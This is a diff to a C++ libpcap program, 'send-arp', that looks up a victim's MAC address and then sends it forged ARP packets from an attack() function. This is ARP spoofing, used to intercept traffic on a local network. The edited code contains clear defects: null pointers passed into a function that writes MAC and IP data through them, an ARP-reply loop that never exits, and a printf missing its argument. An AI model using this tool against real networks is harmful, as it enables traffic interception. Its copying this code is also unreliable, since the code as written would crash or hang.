@@ -17,32 +17,32 @@ struct EthArpPacket final {
 #pragma pack(pop)
 
 void usage() {
-    printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]n");
+    printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
     printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
 }
 
-int get_myinfo(uint8_t* mac, char* ip, char* interface){
+void get_myinfo(uint8_t* mac, char* ip, char* interface){
     int sock;
     struct ifreq ifr;
 
     sock = socket(AF_INET, SOCK_STREAM, 0);
     if (sock < 0){
         fprintf(stderr, "Fail to get interface MAC address - socket() failed - %m\n");
-        return -1;
+        exit(-1);
     }
 
     strncpy(ifr.ifr_name, interface, IFNAMSIZ);
     if (ioctl(sock, SIOCGIFHWADDR, &ifr)<0){
         fprintf(stderr, "Fail to get interface MAC address - ioctl(SIOCSIFHWADDR) failed - %m\n");
         close(sock);
-        return -1;
+        exit(-1);
     }
     memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
 
     if (ioctl(sock, SIOCGIFADDR, &ifr)<0){
         fprintf(stderr, "Fail to get interface MAC address - ioctl(SIOCSIFHWADDR) failed - %m\n");
         close(sock);
-        return -1;
+        exit(-1);
     }
 
     inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2, ip, sizeof(struct sockaddr));
@@ -50,10 +50,9 @@ int get_myinfo(uint8_t* mac, char* ip, char* interface){
     close(sock);
 
     printf("Sucess to get interface(%s) MAC address");
-    return 0;
 }
 
-int get_smac(Mac& smac, Ip& sip, Ip& myip, Mac& mymac, pcap_t* handle){
+void get_smac(Mac& smac, Ip& sip, Ip& myip, Mac& mymac, pcap_t* handle){
     EthArpPacket packet;
 
     packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
@@ -74,6 +73,7 @@ int get_smac(Mac& smac, Ip& sip, Ip& myip, Mac& mymac, pcap_t* handle){
     int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
     if (res != 0) {
         fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+        exit(-1);
     }
 
     while(true){
@@ -83,7 +83,7 @@ int get_smac(Mac& smac, Ip& sip, Ip& myip, Mac& mymac, pcap_t* handle){
         if (res == 0) continue;
         if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK){
             fprintf(stderr, "pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
-            break;
+            exit(-1);
         }
         EthArpPacket* reply = (EthArpPacket*)packet;
         if (reply->eth_.type_ != htons(EthHdr::Arp)) continue;
@@ -91,11 +91,10 @@ int get_smac(Mac& smac, Ip& sip, Ip& myip, Mac& mymac, pcap_t* handle){
 
         smac = Mac(reply->arp_.smac_);
         printf("ARP replied\n");
-
     }
 }
 
-int attack(Ip& tip, Mac& smac, Ip& sip, Ip& myip, Mac& mymac, pcap_t* handle){
+void attack(Ip& tip, Mac& smac, Ip& sip, Ip& myip, Mac& mymac, pcap_t* handle){
     EthArpPacket packet;
 
     packet.eth_.dmac_ = smac;
@@ -116,8 +115,8 @@ int attack(Ip& tip, Mac& smac, Ip& sip, Ip& myip, Mac& mymac, pcap_t* handle){
     int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
     if (res != 0) {
         fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+        exit(-1);
     }
-    return 0;
 }
 
 int main(int argc, char* argv[]) {
@@ -135,14 +134,14 @@ int main(int argc, char* argv[]) {
 	}
 
     // get my info
-    uint8_t* mac;
-    char* ip;
+    uint8_t* mac = nullptr;
+    char* ip = nullptr;
+    get_myinfo(mac, ip, dev);
 
-    get_myinfo(mac, ip, argv[1]);
     Mac mymac(mac);
     Ip myip(ip);
 
-    for (int i=1;i<argc;i+=2){
+    for (int i=2;i<argc;i+=2){
         // get sender info
         Ip sip = Ip(argv[i]);
         Mac smac;
@@ -153,4 +152,5 @@ int main(int argc, char* argv[]) {
         attack(tip, smac, sip, myip, mymac, handle);
     }
     pcap_close(handle);
+    return 0;
 }
